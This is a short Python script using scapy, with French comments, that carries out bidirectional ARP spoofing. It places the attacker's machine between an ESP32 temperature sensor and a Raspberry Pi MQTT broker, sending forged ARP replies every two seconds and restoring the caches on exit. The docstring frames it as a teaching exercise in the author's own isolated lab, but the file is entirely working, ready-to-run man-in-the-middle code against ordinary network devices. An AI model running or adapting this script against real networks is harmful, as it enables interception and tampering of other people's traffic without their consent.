#!/usr/bin/env python3
"""
spoof.py — ARP spoofing bidirectionnel (MITM) entre l'ESP32 et le Pi (broker MQTT).
Usage : sudo ./venv/bin/python3 spoof.py
Arrêt propre : Ctrl+C -> restaure les caches ARP des deux victimes.
Cadre : laboratoire isolé dont je suis propriétaire (usage pédagogique).
"""
import sys
import time
from scapy.all import ARP, Ether, srp, sendp, get_if_hwaddr

IFACE  = "wlp0s20f3"
PI_IP  = "192.168.50.182"     # broker Mosquitto (victime 1)
ESP_IP = "192.168.50.223"     # capteur de température (victime 2)

def get_mac(ip):
    """Résout la MAC réelle d'une IP via une requête ARP broadcast (op=1)."""
    ans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
              timeout=2, iface=IFACE, verbose=False)[0]
    return ans[0][1].hwsrc if ans else None

def poison(target_ip, target_mac, spoof_ip):
    """
    Fausse réponse ARP (op=2) : 'spoof_ip est à MA MAC'.
    Envoyée en niveau 2 (Ether/sendp) directement à la MAC de la victime.
    hwsrc omis => scapy insère la MAC de notre interface.
    """
    pkt = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    sendp(pkt, iface=IFACE, verbose=False)

def restore(target_ip, target_mac, spoof_ip, spoof_mac):
    """Réinjecte la VRAIE correspondance IP<->MAC dans le cache de `target`."""
    pkt = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac,
              psrc=spoof_ip, hwsrc=spoof_mac)
    sendp(pkt, count=5, iface=IFACE, verbose=False)

def main():
    my_mac  = get_if_hwaddr(IFACE)
    pi_mac  = get_mac(PI_IP)
    esp_mac = get_mac(ESP_IP)
    if not pi_mac or not esp_mac:
        sys.exit(f"[!] Résolution MAC échouée (Pi={pi_mac}, ESP32={esp_mac}).")

    print(f"[*] Attaquant : {my_mac}")
    print(f"[*] Pi        : {PI_IP} -> {pi_mac}")
    print(f"[*] ESP32     : {ESP_IP} -> {esp_mac}")
    print("[*] Empoisonnement en cours... (Ctrl+C pour arreter et restaurer)")

    try:
        while True:
            poison(ESP_IP, esp_mac, PI_IP)   # à l'ESP32 : "le Pi = ma MAC"
            poison(PI_IP, pi_mac, ESP_IP)    # au Pi : "l'ESP32 = ma MAC"
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[*] Arret — restauration des caches ARP...")
        restore(ESP_IP, esp_mac, PI_IP, pi_mac)
        restore(PI_IP, pi_mac, ESP_IP, esp_mac)
        print("[*] Caches restaures. Lab propre.")

if __name__ == "__main__":
    main()
